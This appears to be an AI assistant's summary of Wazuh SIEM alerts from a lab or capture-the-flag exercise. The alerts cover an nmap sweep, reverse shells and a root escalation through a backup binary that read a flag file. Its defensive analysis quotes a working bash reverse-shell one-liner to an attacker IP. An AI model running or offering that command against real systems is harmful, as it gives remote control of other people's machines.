# Attack Investigation Summary

Based on the Wazuh SIEM analysis of the last hour, **YES, there were significant attacks detected**. Here's what I found:

## 🚨 **Critical Security Incidents (Level 12 Alerts)**

**1. Privilege Escalation & Data Exfiltration** (03:51:49 & 03:51:42)

- **Attack Vector**: Malicious backup binary execution
- **Impact**: Root access obtained and flag.txt (sensitive data) exfiltrated
- **Details**: Attacker executed `/usr/local/bin/backup` with commands:
  - `backup config_verify` - extracted `/root/flag.txt`
  - `backup audit_sample` - confirmed root access via `whoami`
- **Container**: `88eff591f3d5` (victim-host)

## 🔍 **Reverse Shell Activity (Level 6 Alerts)**

**2. Multiple Reverse Shell Connections** (03:50:16 - multiple instances)

- **Attack Vector**: Network redirections to establish persistent access
- **Connection**: `172.20.0.20:37744 -> 172.20.0.30:8443`
- **Command**: `bash -c exec bash -i >& /dev/tcp/172.20.0.30/8443 0>&1`
- **Impact**: Interactive shell established from victim to attacker system

## 🌐 **Network Reconnaissance** (03:47:24)

- **Tool**: nmap scan executed (`nmap --privileged -sn 172.20.0.1-50`)
- **Impact**: Network discovery of lab infrastructure

## 📋 **Administrative Activity Pattern**

- Legitimate SSH connections from `172.20.0.1` (labadmin user)
- System cleanup activities (removing CTF infrastructure)
- User account management (webservice user deletion)

## **Attack Timeline**

1. **03:47:24** - Network reconnaissance (nmap scan)
2. **03:50:16** - Reverse shell establishment
3. **03:51:42** - Root privilege escalation confirmation
4. **03:51:49** - Sensitive data exfiltration (`/root/flag.txt`)
5. **04:11:10** - Administrative cleanup/reset

**Risk Level**: **HIGH** - The attacks successfully achieved:

- ✅ Initial access
- ✅ Privilege escalation to root
- ✅ Persistent access via reverse shell
- ✅ Data exfiltration of sensitive files

This appears to be a successful penetration test or CTF scenario where an attacker gained complete system compromise.
